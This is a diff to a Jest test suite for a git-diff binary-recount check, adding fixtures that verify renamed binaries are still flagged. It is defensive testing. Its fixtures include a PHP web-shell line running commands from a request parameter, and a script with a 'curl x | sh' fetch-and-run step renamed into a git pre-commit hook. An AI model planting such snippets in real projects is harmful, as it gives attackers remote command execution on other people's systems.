@@ -598,10 +598,11 @@ describe('gitDiffBinaryRecount', () => {
 
   // Numstat prints `-\t-` for a binary pair even when its content is unchanged,
   // so a moved PDF or PNG over the cap was recounted as 0 lines and forged, and
-  // moved small PNGs spent the budget. Under another extension the same bytes
-  // are read as something else (a PNG's `<?php` block as PHP), and a mode
-  // change adds what the new mode runs, so both are still recounted, their
-  // non-null 0 lines flagged (decision 154).
+  // moved small PNGs spent the budget. Under another extension, one cased
+  // otherwise, or none (no dot, or a trailing one), the same bytes can be read
+  // as something else (a PNG's `<?php` block as PHP, a payload as a hook), and
+  // a mode change adds what the new mode runs, so all are still recounted,
+  // their non-null 0 lines flagged (decision 154).
   it('answers null for a binary moved unchanged under its extension, and spends nothing', () => {
     const php = '<?php system($_GET["c"]); ?>\n';
     const repo = repoWith(
@@ -614,6 +615,9 @@ describe('gitDiffBinaryRecount', () => {
         'sh.png': png('echo sh\n'),
         'dat.png': png('dat\n'),
         'code.pdf': `%PDF-//\0\nmodule.exports = 1;\n`,
+        payload: '#!/bin/sh\n# \0\ncurl x | sh\n',
+        'x.PHP': `<?php // \0\n${php}`,
+        'a.': `// \0\n${php}`,
       },
       { 'other.ts': 'x\n' },
     );
@@ -625,25 +629,40 @@ describe('gitDiffBinaryRecount', () => {
     sh(repo, 'git', 'mv', 'sh.png', 'run.sh');
     sh(repo, 'git', 'mv', 'dat.png', 'blob.dat');
     sh(repo, 'git', 'mv', 'code.pdf', 'code.js');
+    sh(repo, 'git', 'mv', 'payload', 'pre-commit');
+    sh(repo, 'git', 'mv', 'x.PHP', 'x.php');
+    sh(repo, 'git', 'mv', 'a.', 'b.php.');
     sh(repo, 'git', 'commit', '-q', '-m', 'move');
     const budget = fullBudget();
 
     expect(gitDiffNumstat(repo, 'main', 'feature')).toMatchObject([
+      { path: 'b.php.', added: null, deleted: null, renamedFrom: 'a.' },
       { path: 'blob.dat', added: null, deleted: null, renamedFrom: 'dat.png' },
       { path: 'code.js', added: null, deleted: null, renamedFrom: 'code.pdf' },
       { path: 'guide.pdf', added: null, deleted: null, renamedFrom: 'manual.pdf' },
       { path: 'large.png', added: null, deleted: null, renamedFrom: 'big.png' },
       { path: 'other.ts', added: 1, deleted: 0 },
+      { path: 'pre-commit', added: null, deleted: null, renamedFrom: 'payload' },
       { path: 'run.php', added: null, deleted: null, renamedFrom: 'php.png' },
       { path: 'run.png', added: null, deleted: null },
       { path: 'run.sh', added: null, deleted: null, renamedFrom: 'sh.png' },
       { path: 'tiny.png', added: null, deleted: null, renamedFrom: 'small.png' },
+      { path: 'x.php', added: null, deleted: null, renamedFrom: 'x.PHP' },
     ]);
     for (const path of ['guide.pdf', 'large.png', 'tiny.png']) {
       expect(recount(repo, path, budget)).toBeNull();
     }
     expect(budget.bytes).toBe(BINARY_FREE_TOTAL_MAX_BYTES);
-    for (const path of ['run.png', 'run.php', 'run.sh', 'blob.dat', 'code.js']) {
+    for (const path of [
+      'run.png',
+      'run.php',
+      'run.sh',
+      'blob.dat',
+      'code.js',
+      'pre-commit',
+      'x.php',
+      'b.php.',
+    ]) {
       expect(recount(repo, path, budget)).toEqual({ added: 0, deleted: 0 });
     }
     expect(budget.bytes).toBe(BINARY_FREE_TOTAL_MAX_BYTES);
@@ -2010,13 +2029,14 @@ describe('known-binary.utils', () => {
     });
   });
 
-  // A same-oid rename skips only under one extension, so this is what the
-  // recount compares, and what `formatsNamed` reads.
+  // A same-oid rename skips only under one extension as written, so this is
+  // what the recount compares, and what `formatsNamed` folds.
   describe('extensionOf', () => {
-    it('reads the basename from its last dot, ASCII-folded, or nothing', () => {
-      expect(extensionOf('docs/guide/Manual.PDF')).toBe('.pdf');
-      expect(extensionOf('a.tar.GZ')).toBe('.gz');
+    it('reads the basename from its last dot as written, or nothing', () => {
+      expect(extensionOf('docs/guide/Manual.PDF')).toBe('.PDF');
+      expect(extensionOf('a.tar.GZ')).toBe('.GZ');
       expect(extensionOf('assets/.png')).toBe('.png');
+      expect(extensionOf('b.php.')).toBe('.');
       expect(extensionOf('v1.2/Makefile')).toBe('');
       expect(extensionOf('clip.mKv')).toBe('.mKv');
       expect(formatsNamed('assets/.png')).toEqual(pngFormats);
